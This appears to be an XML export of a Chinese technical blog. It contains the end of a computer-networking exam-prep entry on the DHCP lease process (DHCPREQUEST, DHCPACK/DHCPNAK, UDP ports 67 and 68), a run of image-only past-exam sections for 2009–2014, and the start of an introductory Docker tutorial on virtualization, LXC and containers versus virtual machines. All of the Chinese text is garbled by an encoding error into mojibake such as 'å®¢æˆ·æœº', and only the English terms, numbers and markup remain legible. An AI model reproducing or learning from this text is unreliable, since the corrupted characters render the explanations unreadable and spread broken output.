<li><p>å®¢æˆ·æœºé€‰æ‹©IPï¼ˆå®¢æˆ·æœºå‘DHCPREQUESTå¹¿æ’­åŒ…ï¼‰ï¼›</p>
<p>DHCPå®¢æˆ·æœºä»æ¥æ”¶åˆ°çš„ç¬¬ä¸€ä¸ªDHCPOFFERæ¶ˆæ¯ä¸­é€‰æ‹©IPåœ°å€ï¼Œå‘å‡ºIPåœ°å€çš„DHCPæœåŠ¡å™¨å°†è¯¥åœ°å€ä¿ç•™ï¼Œè¿™æ ·è¯¥åœ°å€å°±ä¸èƒ½æä¾›ç»™å¦ä¸€ä¸ªDHCPå®¢æˆ·æœºã€‚å½“å®¢æˆ·æœºä»ç¬¬ä¸€ä¸ªDHCPæœåŠ¡å™¨æ¥æ”¶DHCPOFFERå¹¶é€‰æ‹©IPåœ°å€åï¼ŒDHCPç§Ÿçº¦çš„ç¬¬ä¸‰è¿‡ç¨‹å‘ç”Ÿã€‚å®¢æˆ·æœºå°†DHCPREQUESTæ¶ˆæ¯å¹¿æ’­åˆ°æ‰€æœ‰çš„DHCPæœåŠ¡å™¨ï¼Œè¡¨æ˜å®ƒæ¥å—æä¾›çš„å†…å®¹ã€‚DHCPREQUESTæ¶ˆæ¯åŒ…æ‹¬ä¸ºè¯¥å®¢æˆ·æœºæä¾›IPé…ç½®çš„æœåŠ¡å™¨çš„æœåŠ¡æ ‡è¯†ç¬¦ï¼ˆIPåœ°å€ï¼‰ã€‚DHCPæœåŠ¡å™¨æŸ¥çœ‹æœåŠ¡å™¨æ ‡è¯†ç¬¦å­—æ®µï¼Œä»¥ç¡®å®šå®ƒè‡ªå·±æ˜¯å¦è¢«é€‰æ‹©ä¸ºæŒ‡å®šçš„å®¢æˆ·æœºæä¾›IPåœ°å€ï¼Œå¦‚æœé‚£äº›DHCPOFFERè¢«æ‹’ç»ï¼Œåˆ™DHCPæœåŠ¡å™¨ä¼šå–æ¶ˆæä¾›å¹¶ä¿ç•™å…¶IPåœ°å€ä»¥ç”¨äºä¸‹ä¸€ä¸ªIPç§Ÿçº¦è¯·æ±‚ã€‚</p>
<p>åœ¨å®¢æˆ·æœºé€‰æ‹©IPçš„è¿‡ç¨‹ä¸­ï¼Œè™½ç„¶å®¢æˆ·æœºé€‰æ‹©äº†IPåœ°å€ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰é…ç½®IPåœ°å€ï¼Œè€Œåœ¨ä¸€ä¸ªç½‘ç»œä¸­å¯èƒ½æœ‰å‡ ä¸ªDHCPæœåŠ¡å™¨ï¼Œæ‰€ä»¥å®¢æˆ·æœºä»ç„¶ä½¿ç”¨0.0.0.0çš„åœ°å€ä½œä¸ºæºåœ°å€ï¼Œä½¿ç”¨UDP68ç«¯å£ä½œä¸ºæºç«¯å£ï¼Œä½¿ç”¨255.255.255.255ä½œä¸ºç›®æ ‡åœ°å€ï¼Œä½¿ç”¨UDP67ç«¯å£ä½œä¸ºç›®çš„ç«¯å£æ¥å¹¿æ’­DHCPREQUESTä¿¡æ¯ã€‚</p>
</li>
<li><p>æœåŠ¡å™¨ç¡®å®šç§Ÿçº¦ï¼ˆæœåŠ¡å™¨å‘DHCPACK&#x2F;DHCPNAKå¹¿æ’­åŒ…ï¼‰ã€‚</p>
<p>HCPæœåŠ¡å™¨æ¥æ”¶åˆ°DHCPREQUESTæ¶ˆæ¯åï¼Œä»¥DHCPACKæ¶ˆæ¯çš„å½¢å¼å‘å®¢æˆ·æœºå¹¿æ’­æˆåŠŸçš„ç¡®è®¤ï¼Œè¯¥æ¶ˆæ¯åŒ…å«æœ‰IPåœ°å€çš„æœ‰æ•ˆç§Ÿçº¦å’Œå…¶ä»–å¯èƒ½é…ç½®çš„ä¿¡æ¯ã€‚è™½ç„¶æœåŠ¡å™¨ç¡®è®¤äº†å®¢æˆ·æœºçš„ç§Ÿçº¦è¯·æ±‚ï¼Œä½†æ˜¯å®¢æˆ·æœºè¿˜æ²¡æœ‰æ”¶åˆ°æœåŠ¡å™¨çš„DHCPACKæ¶ˆæ¯ï¼Œæ‰€ä»¥æœåŠ¡å™¨ä»ç„¶ä½¿ç”¨è‡ªå·±çš„IPåœ°å€ä½œä¸ºæºåœ°å€ï¼Œä½¿ç”¨UDP67ç«¯å£ä½œä¸ºæºç«¯å£ï¼Œä½¿ç”¨255.255.255.255ä½œä¸ºç›®æ ‡åœ°å€ï¼Œä½¿ç”¨UDP68ç«¯å£ä½œä¸ºç›®çš„ç«¯å£æ¥å¹¿æ’­DHCPACKä¿¡æ¯ï¼ˆè§å›¾å››ï¼‰ã€‚å½“å®¢æˆ·æœºæ”¶åˆ°DHCPACKæ¶ˆæ¯æ—¶ï¼Œå®ƒå°±é…ç½®äº†IPåœ°å€ï¼Œå®Œæˆäº†TCP&#x2F;IPçš„åˆå§‹åŒ–ã€‚</p>
<p>å¦‚æœDHCPREQUESTä¸æˆåŠŸï¼Œä¾‹å¦‚å®¢æˆ·æœºè¯•å›¾ç§Ÿçº¦å…ˆå‰çš„IPåœ°å€ï¼Œä½†è¯¥IPåœ°å€ä¸å†å¯ç”¨ï¼Œæˆ–è€…å› ä¸ºå®¢æˆ·æœºç§»åˆ°å…¶ä»–å­ç½‘ï¼Œè¯¥IPæ— æ•ˆæ—¶ï¼ŒDHCPæœåŠ¡å™¨å°†å¹¿æ’­å¦å®šç¡®è®¤æ¶ˆæ¯DHCPNAKã€‚å½“å®¢æˆ·æœºæ¥æ”¶åˆ°ä¸æˆåŠŸçš„ç¡®è®¤æ—¶ï¼Œå®ƒå°†é‡æ–°å¼€å§‹DHCPç§Ÿçº¦è¿‡ç¨‹ã€‚</p>
<h2 id="2014"><a href="#2014" class="headerlink" title="2014"></a>2014</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448091.png" alt="æˆªå±2021-10-23 ä¸‹åˆ2.49.00"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448092.png" alt="image-20211023144842130"></p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448094.png" alt="image-20211023144956317"></p>
<p>TTLï¼šTime To Live</p>
<h2 id="2013"><a href="#2013" class="headerlink" title="2013"></a>2013</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448095.png" alt="image-20211023150334299"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448096.png" alt="image-20211023150356523"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448097.png" alt="image-20211023150602726"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448098.png" alt="image-20211023150619721"></p>
<h2 id="2012"><a href="#2012" class="headerlink" title="2012"></a>2012</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448099.png" alt="image-20211023153215305"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448100.png" alt="image-20211023153246832"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448101.png" alt="image-20211023153411242"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448102.png" alt="image-20211023153425162"></p>
<h2 id="2011"><a href="#2011" class="headerlink" title="2011"></a>2011</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448103.png" alt="image-20211023154150691"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448104.png" alt="image-20211023154204203"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448105.png" alt="image-20211023155222392"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448106.png" alt="image-20211023155236913"></p>
<h2 id="2010"><a href="#2010" class="headerlink" title="2010"></a>2010</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448107.png" alt="image-20211023160654801"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448108.png" alt="image-20211023160715367"></p>
<h2 id="2009"><a href="#2009" class="headerlink" title="2009"></a>2009</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448109.png" alt="image-20211023160944162"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448110.png" alt="image-20211023160955832"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448111.png" alt="image-20211023161433080"></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211448112.png" alt="image-20211023161446545"></p>
]]></content>
      <categories>
        <category>408</category>
      </categories>
      <tags>
        <tag>è€ƒç ”</tag>
        <tag>408</tag>
        <tag>è®¡ç®—æœºç½‘ç»œ</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/2021/12/21/%E9%9D%A2%E8%AF%95/Docker/</url>
    <content><![CDATA[<h1 id="ç¬¬ä¸€ç« -Dockeræ¦‚è¿°"><a href="#ç¬¬ä¸€ç« -Dockeræ¦‚è¿°" class="headerlink" title="ç¬¬ä¸€ç«  Dockeræ¦‚è¿°"></a>ç¬¬ä¸€ç«  Dockeræ¦‚è¿°</h1><h2 id="1-1-è™šæ‹ŸåŒ–æŠ€æœ¯å‘å±•å²"><a href="#1-1-è™šæ‹ŸåŒ–æŠ€æœ¯å‘å±•å²" class="headerlink" title="1.1 è™šæ‹ŸåŒ–æŠ€æœ¯å‘å±•å²"></a>1.1 è™šæ‹ŸåŒ–æŠ€æœ¯å‘å±•å²</h2><p>åœ¨è™šæ‹ŸåŒ–æŠ€æœ¯å‡ºç°ä¹‹å‰ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æ­å»ºä¸€å°æœåŠ¡å™¨ï¼Œæˆ‘ä»¬éœ€è¦åšå¦‚ ä¸‹çš„å·¥ä½œ:</p>
<ol>
<li><p>è´­ä¹°ä¸€å°ç¡¬ä»¶æœåŠ¡å™¨;</p>
</li>
<li><p>åœ¨ç¡¬ä»¶æœåŠ¡å™¨ä¸Šå®‰è£…é…ç½®æ“ä½œç³»ç»Ÿç³»ç»Ÿ;</p>
</li>
<li><p>åœ¨æ“ä½œç³»ç»Ÿä¹‹ä¸Šé…ç½®åº”ç”¨è¿è¡Œç¯å¢ƒ; </p>
</li>
<li><p>éƒ¨ç½²å¹¶è¿è¡Œåº”ç”¨;</p>
</li>
</ol>
<p>è¿™ç§æ–¹å¼çš„ç¼ºç‚¹å°±æ˜¯:</p>
<ol>
<li><p>éƒ¨ç½²åº”ç”¨éå¸¸æ…¢;</p>
</li>
<li><p>éœ€è¦èŠ±è´¹çš„æˆæœ¬éå¸¸é«˜(æ—¶é—´æˆæœ¬ã€æœåŠ¡å™¨æˆæœ¬);</p>
</li>
<li><p>åº”ç”¨è¿ç§»éº»çƒ¦;è¦å°†åº”ç”¨è¿ç§»ï¼Œåˆå¾—é‡å¤éƒ¨ç½²åº”ç”¨çš„è¿‡ç¨‹:è´­ä¹° æœåŠ¡å™¨ -&gt; å®‰è£…æ“ä½œç³»ç»Ÿ OS -&gt; é…ç½®è¿è¡Œç¯å¢ƒ -&gt; éƒ¨ç½²åº”ç”¨ æ‰€ä»¥ï¼Œä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œåç»­å‡ºç°äº†è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚</p>
</li>
</ol>
<h2 id="1-2-è™šæ‹ŸåŒ–æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-2-è™šæ‹ŸåŒ–æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1.2 è™šæ‹ŸåŒ–æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Ÿ"></a>1.2 è™šæ‹ŸåŒ–æŠ€æœ¯æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>è™šæ‹ŸåŒ–(è‹±è¯­:Virtualization)æ˜¯ä¸€ç§è®¡ç®—æœºèµ„æºç®¡ç†æŠ€æœ¯ï¼Œæ˜¯å°†è®¡ç®— æœºçš„å„ç§ç¡¬ä»¶èµ„æºï¼Œæ¯”å¦‚æœåŠ¡å™¨ã€ç½‘ç»œã€CPUã€å†…å­˜åŠå­˜å‚¨ç­‰ï¼Œäºˆä»¥ æŠ½è±¡å’Œè½¬æ¢åå‘ˆç°å‡ºä¸€å¥—æ–°çš„ç¡¬ä»¶èµ„æºç¯å¢ƒï¼Œåœ¨è¿™ä¸€å¥—æ–°çš„ç¡¬ä»¶ç¯å¢ƒ ä¸‹å¯ä»¥å®‰è£…æˆ‘ä»¬çš„æ“ä½œç³»ç»Ÿï¼Œéƒ¨ç½²æˆ‘ä»¬çš„åº”ç”¨è¿è¡Œç¯å¢ƒç­‰ï¼Œå®ƒæ‰“ç ´è®¡ç®—æœºç¡¬ä»¶èµ„æºä¸å¯åˆ‡å‰²çš„éšœç¢ï¼Œä½¿æˆ‘ä»¬å¯ä»¥æ¯”åŸæœ¬çš„è®¡ç®—æœºç¡¬ä»¶èµ„æº ç»“æ„æ›´å¥½çš„æ–¹å¼æ¥ç»„åˆåº”ç”¨è¿™äº›èµ„æºã€‚             </p>
<h2 id="1-3-è™šæ‹ŸåŒ–æŠ€æœ¯çš„åˆ†ç±»"><a href="#1-3-è™šæ‹ŸåŒ–æŠ€æœ¯çš„åˆ†ç±»" class="headerlink" title="1.3 è™šæ‹ŸåŒ–æŠ€æœ¯çš„åˆ†ç±»"></a>1.3 è™šæ‹ŸåŒ–æŠ€æœ¯çš„åˆ†ç±»</h2><p>è™šæ‹ŸåŒ–ä¸€èˆ¬åˆ†ä¸ºï¼š</p>
<p>è™šæ‹ŸåŒ–ä¸€èˆ¬åˆ†ä¸º: <strong>ç¡¬ä»¶çº§è™šæ‹ŸåŒ–</strong>(hardware-level-virtualization) <strong>æ“ä½œç³»ç»Ÿçº§è™šæ‹ŸåŒ–</strong>(os-level-virtualization)</p>
<p><strong>ç¡¬ä»¶çº§è™šæ‹ŸåŒ–</strong> æ˜¯è¿è¡Œåœ¨ç¡¬ä»¶ä¹‹ä¸Šçš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå®ƒçš„æ ¸å¿ƒæŠ€æœ¯æ˜¯ Hypervisor å‘éŸ³ [,haipÉ™â€™vaizÉ™]ï¼ŒHypervisor æ˜¯ä¸€ç§è¿è¡Œåœ¨åŸºç¡€ç‰©ç†æœ åŠ¡å™¨ç¡¬ä»¶ä¹‹ä¸Šçš„è½¯ä»¶å±‚ï¼Œå¯ä»¥è™šæ‹ŸåŒ–ç¡¬ä»¶èµ„æºï¼Œä¾‹å¦‚ cpuã€ç¡¬ç›˜ã€å†… å­˜èµ„æºç­‰ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨è™šæ‹ŸåŒ–å‡ºæ¥çš„èµ„æºä¹‹ä¸Šå®‰è£…æ“ä½œç³»ç»Ÿï¼Œ è¿™ä¹Ÿå°±æ˜¯æ‰€è°“çš„è™šæ‹Ÿæœºã€‚åƒ VMWare, VirtualBox ç­‰éƒ½æ˜¯ä½¿ç”¨è¯¥æŠ€æœ¯ï¼Œ æˆ‘ä»¬ç»å¸¸ä½¿ç”¨çš„æ¡Œé¢ç‰ˆçš„è™šæ‹Ÿæœº VMWare å°±æ˜¯é‡‡ç”¨è¿™ç§è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤º:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131390.png" alt="image-20201216232406720"></p>
<h2 id="1-4-è™šæ‹ŸåŒ–æŠ€æœ¯çš„ä¼˜ç¼ºç‚¹"><a href="#1-4-è™šæ‹ŸåŒ–æŠ€æœ¯çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="1.4 è™šæ‹ŸåŒ–æŠ€æœ¯çš„ä¼˜ç¼ºç‚¹"></a>1.4 è™šæ‹ŸåŒ–æŠ€æœ¯çš„ä¼˜ç¼ºç‚¹</h2><p><strong>ä¼˜ç‚¹</strong></p>
<p>ä¸€å°ç‰©ç†æœåŠ¡å™¨å¯ä»¥è™šæ‹ŸåŒ–å‡ºå¤šä¸ªè™šæ‹Ÿçš„æœåŠ¡å™¨ï¼Œè®©è®¡ç®—æœºèµ„æºå¾—å·²å……åˆ†åˆ©ç”¨ï¼›</p>
<p><strong>ç¼ºç‚¹</strong></p>
<ol>
<li>æ¯åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼Œè¿™ä¸ªæ“ä½œç³» ç»Ÿä¼šå ç”¨å¾ˆå¤šèµ„æºï¼Œè¿™æ ·æ— ç–‘å¤§å¤§çš„å¢åŠ äº†èµ„æºçš„æ¶ˆè€—ï¼Œå½“å®‰è£…çš„è™š æ‹Ÿæœºè¶Šå¤šï¼Œèµ„æºæ¶ˆè€—å°±è¶Šå¤šã€‚ </li>
<li>ç¯å¢ƒå…¼å®¹æ€§é—®é¢˜ï¼Œå¼€å‘æ—¶çš„ç¯å¢ƒè¿è¡Œæ­£å¸¸ï¼Œéƒ¨ç½²åˆ°è™šæ‹Ÿæœºç¯å¢ƒæµ‹ è¯•åˆ™æœ‰å¯èƒ½å‘ç”Ÿé”™è¯¯;</li>
</ol>
<h2 id="1-5-å®¹å™¨æŠ€æœ¯çš„å‘å±•"><a href="#1-5-å®¹å™¨æŠ€æœ¯çš„å‘å±•" class="headerlink" title="1.5 å®¹å™¨æŠ€æœ¯çš„å‘å±•"></a>1.5 å®¹å™¨æŠ€æœ¯çš„å‘å±•</h2><p>åŸºäºç¡¬ä»¶çº§è™šæ‹ŸåŒ–æŠ€æœ¯çš„ç¼ºç‚¹å’Œä¸è¶³ï¼Œåç»­åˆå‘å±•å‡ºæ¥äº†å¦ä¸€ç§è™šæ‹Ÿ åŒ–æŠ€æœ¯ï¼Œå³æ“ä½œç³»ç»Ÿçº§è™šæ‹ŸåŒ–æŠ€æœ¯;<br> <strong>æ“ä½œç³»ç»Ÿçº§è™šæ‹ŸåŒ–</strong> æ˜¯è¿è¡Œåœ¨æ“ä½œç³»ç»Ÿä¹‹ä¸Šçš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå®ƒæ¨¡æ‹Ÿçš„ æ˜¯è¿è¡Œåœ¨ä¸€ä¸ªæ“ä½œç³»ç»Ÿä¸Šçš„å¤šä¸ªä¸åŒè¿›ç¨‹ï¼Œå¹¶å°†å…¶å°è£…åœ¨ä¸€ä¸ªå¯†é—­çš„ å®¹å™¨é‡Œé¢ï¼Œè¯¥æŠ€æœ¯ä¹Ÿç§°ä¸ºå®¹å™¨åŒ–æŠ€æœ¯ã€‚</p>
<p>åœ¨å®¹å™¨åŒ–æŠ€æœ¯é¢†åŸŸï¼ŒDocker æ˜¯ç›®å‰æœ€æµè¡Œçš„ä¸€ç§å®ç°ã€‚Docker å‘å¸ƒäº 2013 å¹´ï¼ŒDocker åŸºäº LXC æŠ€æœ¯ï¼ŒLXC æ˜¯ Linux å¹³å°ä¸Šçš„å®¹å™¨åŒ–æŠ€ æœ¯å®ç°ã€‚<br> æ³¨:LXC æ˜¯ Linux Container çš„ç®€å†™ï¼Œå®ƒæ˜¯ä¸€ç§å†…æ ¸è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå¯ ä»¥æä¾›è½»é‡çº§çš„è™šæ‹ŸåŒ–ï¼Œä»¥ä¾¿éš”ç¦»è¿›ç¨‹å’Œèµ„æºï¼Œå®ƒä¸å®¿ä¸»æœºä½¿ç”¨åŒä¸€ ä¸ªå†…æ ¸ï¼Œæ€§èƒ½æŸè€—å°ï¼Œè¿™ç§æŠ€æœ¯æ˜¯ Linux æä¾›çš„ï¼Œä½†æ˜¯ç›´åˆ° Docker å‡ºä¸–ï¼Œè¯¥æŠ€æœ¯æ‰è¢«å‘æŒ¥å‡ºæ¥ã€‚</p>
<h2 id="1-6-Dockerçš„å‘å±•å†å²"><a href="#1-6-Dockerçš„å‘å±•å†å²" class="headerlink" title="1.6 Dockerçš„å‘å±•å†å²"></a>1.6 Dockerçš„å‘å±•å†å²</h2><h2 id="1-7-Dockeræ˜¯ä»€ä¹ˆ"><a href="#1-7-Dockeræ˜¯ä»€ä¹ˆ" class="headerlink" title="1.7 Dockeræ˜¯ä»€ä¹ˆ"></a>1.7 Dockeræ˜¯ä»€ä¹ˆ</h2><ol>
<li>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„åº”ç”¨å®¹å™¨å¼•æ“ï¼Œå®ƒåŸºäº Google å…¬å¸æ¨å‡ºçš„ Go è¯­è¨€å®ç°ï¼Œé¡¹ç›®ä»£ç æ‰˜ç®¡åœ¨ GitHub ä¸Šè¿›è¡Œç»´æŠ¤; <a href="https://github.com/docker/docker-ce">https://github.com/docker/docker-ce</a></li>
<li>Docker æŠ€æœ¯è®©å¼€å‘è€…å¯ä»¥æ‰“åŒ…ä»–ä»¬çš„åº”ç”¨ä»¥åŠä¾èµ–åŒ…åˆ°ä¸€ä¸ªå¯ç§» æ¤çš„å®¹å™¨ä¸­ï¼Œæ‰“åŒ…å¥½çš„å®¹å™¨å¯ä»¥å‘å¸ƒåˆ°ä»»ä½•æµè¡Œçš„ Linux æœåŠ¡å™¨ä¸Šè¿ è¡Œï¼Œè¿™æ ·å°±å¯ä»¥è§£å†³å¼€å‘ç¯å¢ƒä¸è¿ç»´ç¯å¢ƒä¸ä¸€è‡´çš„é—®é¢˜äº†ï¼Œæ‰€ä»¥å®¹å™¨ æŠ€æœ¯è§£å†³äº†å¼€å‘å’Œè¿ç»´ä¹‹é—´çš„çŸ›ç›¾ï¼Œè®©å¼€å‘ä¸“æ³¨äºå¼€å‘ï¼Œè¿ç»´ä¸“æ³¨äº è¿ç»´ï¼Œä¸è¦è¢«ç¯å¢ƒé—®é¢˜æ‰€æ‰“æ‰°;</li>
<li>Dockerå½»åº•é‡Šæ”¾äº†è™šæ‹ŸåŒ–çš„å¨åŠ›ï¼Œæå¤§é™ä½äº†è®¡ç®—æœºèµ„æºä¾›åº”çš„æˆæœ¬ï¼ŒDockeré‡æ–°å®šä¹‰äº†ç¨‹åºå¼€å‘æµ‹è¯•ã€äº¤ä»˜å’Œéƒ¨ç½²è¿‡ç¨‹ï¼ŒDockeræå‡ºäº†â€œæ„å»ºä¸€æ¬¡ï¼Œåˆ°å¤„è¿è¡Œâ€çš„ç†å¿µï¼Œè®©åº”ç”¨çš„å¼€å‘ã€æµ‹è¯•ã€éƒ¨ç½²å’Œåˆ†å‘éƒ½å˜å¾—å‰æ‰€æœªæœ‰çš„é«˜æ•ˆå’Œè½»æ¾ï¼</li>
<li>Docker æ˜¯ä¸€ç§è½»é‡çº§çš„æ“ä½œç³»ç»Ÿè™šæ‹ŸåŒ–è§£å†³æ–¹æ¡ˆï¼ŒDocker çš„åŸºç¡€ æ˜¯ Linux å®¹å™¨(LXC)æŠ€æœ¯ï¼Œåœ¨ LXC çš„åŸºç¡€ä¸Š Docker è¿›è¡Œäº†è¿›ä¸€æ­¥ çš„å°è£…ï¼Œè®©ç”¨æˆ·ä¸éœ€è¦å»å…³å¿ƒå®¹å™¨çš„ç®¡ç†ï¼Œä½¿å¾—æ“ä½œæ›´ä¸ºç®€ä¾¿ã€‚ç”¨æˆ· æ“ä½œ Docker çš„å®¹å™¨å°±åƒæ“ä½œä¸€ä¸ªå¿«é€Ÿè½»é‡çº§çš„è™šæ‹Ÿæœºä¸€æ ·ç®€å•; Docker è‡ªå¼€æºåå—åˆ°å¹¿æ³›çš„å…³æ³¨ï¼ŒDockeræœ€æ—©æ˜¯åŸºäºUbuntuå¼€å‘çš„ï¼Œ ä½†åç»­ CentOSã€Debianã€Fedora ç­‰ä¸»æµçš„ Linux æ“ä½œç³»ç»Ÿéƒ½æ”¯æŒ Docker;</li>
</ol>
<p>**æ€»ç»“:**ç®€å•åœ°è¯´ï¼ŒDocker æ˜¯å¯¹è½¯ä»¶å’Œå…¶ä¾èµ–ç¯å¢ƒçš„æ ‡å‡†åŒ–æ‰“åŒ…ï¼Œåº”ç”¨ ä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œå…±äº«ä¸€ä¸ª OS Kernel(è§£å†³äº†èµ„æºæµªè´¹çš„é—®é¢˜)ï¼Œå¯ ä»¥è¿è¡Œåœ¨å¾ˆå¤šä¸»æµæ“ä½œç³»ç»Ÿä¸Š;<br> ä½†æ˜¯ä¹Ÿéœ€è¦æ¾„æ¸…ä¸€ä¸‹ï¼ŒDocker æœ¬èº«ä¸æ˜¯å®¹å™¨ï¼ŒDocker åªæ˜¯ç®¡ç†å®¹å™¨ çš„å¼•æ“ã€‚</p>
<h2 id="1-8-å®¹å™¨å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«"><a href="#1-8-å®¹å™¨å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«" class="headerlink" title="1.8 å®¹å™¨å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«"></a>1.8 å®¹å™¨å’Œè™šæ‹Ÿæœºçš„åŒºåˆ«</h2><p>å®¹å™¨æ˜¯å°†ä»£ç å’Œç¯å¢ƒçš„å…³ç³»æ‰“åŒ…åœ¨ä¸€èµ·çš„ä¸€ä¸ªé›†åˆï¼Œè€Œè™šæ‹Ÿæœºæ˜¯åœ¨ç‰©ç†å±‚é¢ä¸Šï¼Œåˆ†å‡ºæ¥çš„ä¸€ä¸ªæ“ä½œç³»ç»Ÿï¼›</p>
<p>å¤šä¸ªå®¹å™¨å¯ä»¥è¿è¡Œåœ¨åŒä¸€å°ç‰©ç†æœåŠ¡å™¨ä¸Šï¼Œå¹¶å…±äº«ä¸€ä¸ªæ“ä½œç³»ç»Ÿå†…æ ¸èµ„æºã€‚å¤šä¸ªè™šæ‹Ÿæœºä¹Ÿå¯ä»¥è¿è¡Œåœ¨åŒä¸€å°æœºå™¨ä¸Šï¼Œä½†æ¯å°è™šæ‹Ÿæœºéƒ½éœ€è¦ä¸€ä¸ªå®Œæ•´çš„æ“ä½œç³»ç»Ÿï¼›</p>
<p>ä¸‹å›¾æ¯”è¾ƒäº†Dockerå’Œä¼ ç»Ÿè™šæ‹ŸåŒ–æ–¹å¼çš„ä¸åŒä¹‹å¤„ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131391.png" alt="image-20201216235006051"></p>
<p>å¯è§å®¹å™¨æ˜¯åœ¨æœ¬åœ°æ“ä½œç³»ç»Ÿå±‚é¢ä¸Šå®ç°è™šæ‹ŸåŒ–ï¼Œç›´æ¥å¤ç”¨æœ¬åœ°ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œä¸éœ€è¦å•ç‹¬å®‰è£…æ“ä½œç³»ç»Ÿï¼Œè€Œä¼ ç»Ÿçš„è™šæ‹ŸåŒ–æŠ€æœ¯æ–¹å¼åˆ™éœ€è¦å•ç‹¬å®‰è£…æ¯ä¸ªè™šæ‹Ÿæœºçš„æ“ä½œç³»ç»Ÿã€‚</p>
<table>
<thead>
<tr>
<th>ç‰¹æ€§</th>
<th>å®¹å™¨</th>
<th>è™šæ‹Ÿæœº</th>
</tr>
</thead>
<tbody><tr>
<td>å¯åŠ¨</td>
<td>ç§’çº§</td>
<td>åˆ†é’Ÿçº§</td>
</tr>
<tr>
<td>ç¡¬ç›˜ç©ºé—´</td>
<td>ä¸€èˆ¬ä¸ºå‡ åMB</td>
<td>ä¸€èˆ¬ä¸º10GB</td>
</tr>
<tr>
<td>æ€§èƒ½</td>
<td>æ¥è¿‘åŸç”Ÿ</td>
<td>å¼±äºåŸç”Ÿ</td>
</tr>
<tr>
<td>ç³»ç»Ÿæ”¯æŒé‡</td>
<td>å•æœºæ”¯æŒä¸Šåƒä¸ªå®¹å™¨</td>
<td>ä¸€èˆ¬å‡ åä¸ª</td>
</tr>
<tr>
<td>æ“ä½œç³»ç»Ÿ</td>
<td>ä¸å®¿ä¸»æœºå…±äº«os</td>
<td>å®¿ä¸»æœºosä¸Šè¿è¡Œè™šæ‹Ÿæœºos</td>
</tr>
</tbody></table>
<h2 id="1-9-ä¸ºä»€ä¹ˆä½¿ç”¨Docker"><a href="#1-9-ä¸ºä»€ä¹ˆä½¿ç”¨Docker" class="headerlink" title="1.9 ä¸ºä»€ä¹ˆä½¿ç”¨Docker"></a>1.9 ä¸ºä»€ä¹ˆä½¿ç”¨Docker</h2><p>ä½œä¸ºä¸€ç§æ–°å…´çš„è™šæ‹ŸåŒ–æŠ€æœ¯ï¼ŒDocker è·Ÿä¼ ç»Ÿçš„è™šæ‹ŸåŒ–æ–¹å¼ç›¸æ¯”å…·æœ‰ ä¼—å¤šçš„ä¼˜åŠ¿ã€‚</p>
<ol>
<li><p>Docker å®¹å™¨çš„å¯åŠ¨å¯ä»¥åœ¨ç§’çº§å®ç°ï¼Œè¿™ç›¸æ¯”ä¼ ç»Ÿçš„è™šæ‹Ÿæœºæ–¹å¼è¦ å¿«å¾—å¤šã€‚</p>
</li>
